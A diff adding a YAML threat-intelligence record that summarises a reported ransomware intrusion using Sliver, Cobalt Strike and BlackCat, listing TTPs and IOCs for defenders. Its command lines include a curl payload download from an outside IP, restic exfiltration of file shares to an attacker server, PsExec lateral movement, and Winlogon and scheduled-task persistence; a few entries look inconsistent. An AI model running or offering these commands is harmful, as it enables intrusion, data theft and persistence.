@@ -1,0 +1,128 @@
+description: A threat actor used a combination of PowerShell, Python, and Windows
+  command shell to download, extract, and execute malicious payloads from external
+  servers, establish persistence via scheduled tasks and registry modifications, and
+  exfiltrate data using restic.
+attribution: APT group unknown, likely RedGuard or similar
+malware_families:
+- Sliver
+- Cobalt Strike
+- Restic
+- BlackCat
+- RedGuard
+- BlackCat Ransomware
+TTPs:
+  processes:
+  - python.exe
+  - cmd.exe
+  - winlogon.exe
+  - psexec.exe
+  - UpdateEdge.bat
+  - cad.exe
+  - curl.exe
+  - powershell.exe
+  - pythonw.exe
+  - PsExecb4.exe
+  - reg.exe
+  - schtasks.exe
+  commandline:
+  - cmd.exe /C PsExec64.exe -accepteula \\\\<DOMAIN-CONTROLLER-IP> -c -f -d -s up.bat
+  - cmd.exe /C for /f %a in (pc.txt) do copy /y \\\\<REDACTED>\\c$\\<REDACTED>.exe
+    \\\\%a\\c$\\<REDACTED>.exe
+  - cmd.exe /C PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat
+  - restic.exe -r rest:http://195.123.226.84:8000/ init --password-file ppp.txt
+  - restic.exe -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot
+    --verbose backup "F:\\Shares\\<REDACTED>\\<REDACTED>"
+  - '''cad.exe /Q /c cd \\127.8.8.1\ADHINS\__1699460381.628624520'''
+  - '''curl -k https://91.92.245.26/python.zip -o c:\windows\adfs\py\python.zip'''
+  - '''powershell -w hidden -command Expand-Archive C:\windows\adfs\py\python.zip
+    -DestinationPath C:\windows\adfs\py\'''
+  - '''pythonw.exe wol4.py'''
+  - '''cmd.exe /C PsExecb4.exe -accepteula\\FILESERVER -c -f -d -h l.bat'''
+  - '''reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+    /t reg_sz /d "c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat"
+    /f'''
+  - '''schtasks /create /I 1 /TR C:\Users\[REDACTED]\AppData\Local\Notepad\UpdateEG.bat
+    /TN UpdateEdge /SC ONIDLE'''
+  powershell:
+  - PowerSploit
+  - SharpHound
+  - PowerView
+  - powershell -w hidden -command Expand-Archive C:\\windows\\adfs\\py\\python.zip
+    -DestinationPath C:\\windows\\adfs\\py\\
+  scripting_engine:
+  - slv.py
+  - wo12.py
+  - wo14.py
+  - up.bat
+  - 1.bat
+  - curl -k https://91.92.245.26/python.zip -o c:\\windows\\adfs\\py\\python.zip
+  registry_keys:
+  - HKLM\\software\\microsoft\\windows nt\\currentversion\\winlogon UserInit
+  - HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
+  image_load:
+  - python311.dll
+  network_connections:
+  - process: Cobalt Strike beacon
+    destination: 91.92.250.65
+    port: 443
+  - process: Cobalt Strike beacon
+    destination: 91.92.250.60
+    port: 443
+  - process: CobaltStrike.exe
+    destination: 91.92.250.60
+    port: 81
+  - process: CobaltStrike.exe
+    destination: 195.123.226.84
+    port: 8000
+  - process: curl.exe
+    destination: 91.92.245.26
+    port: 443
+  - process: powershell.exe
+    destination: 91.92.250.60
+    port: 443
+  - process: pythonw.exe
+    destination: 91.92.250.65
+    port: 443
+  - process: restic.exe
+    destination: 195.123.226.84
+    port: 8000
+  file_activity:
+  - '%AppData%\\Notepad\\slv.py'
+  - '%AppData%\\Notepad\\data.aes'
+  - '%AppData%\\Notepad\\UpdateEdge.bat'
+  - '%Public%\\Downloads\\Advanced IP Scanner.exe'
+  - F:\\Shares\\<REDACTED>\\<REDACTED>
+  - c:\\windows\\adfs\\py\\python.zip
+  - C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\slv.py
+  - C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\UpdateEG.bat
+  persistence:
+  - PsExec remote execution of up.bat and 1.bat
+  - Registry RunOnce key addition via reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
+    /v *a /t REG_SZ /d "cmd.exe /c C:\\<REDACTED-COMPANY-NAME>.exe"
+  - Scheduled task creation via schtasks /create ...
+  - Scheduled Task creation via schtasks.exe
+  - Registry modification of Userinit for persistence
+  process_relations: []
+IOCs:
+  ips:
+  - 91.92.250.65
+  - 91.92.250.60
+  - 195.123.226.84
+  hashes:
+  - DBF5F56998705C37076B6CAE5D0BFB4D
+  - E6AB3C595AC703AFD94618D1CA1B8EBCE623B21F
+  - 5DC8B08C7E1B11ABF2B6B311CD7E411DB16A7C3827879C6F93BD0DAC7A71D321
+  ip_addresses:
+  - 91.92.245.26
+  - 91.92.250.60
+  - 91.92.250.65
+  - 194.49.94.18
+  - 194.169.175.134
+  - 195.123.226.84
+  domains:
+  - '*.aliyun.com'
+authors:
+- Angelo Violetti
+reference: https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware
+date_of_publication: September 30, 2024
+file_creation_date: October 05, 2025
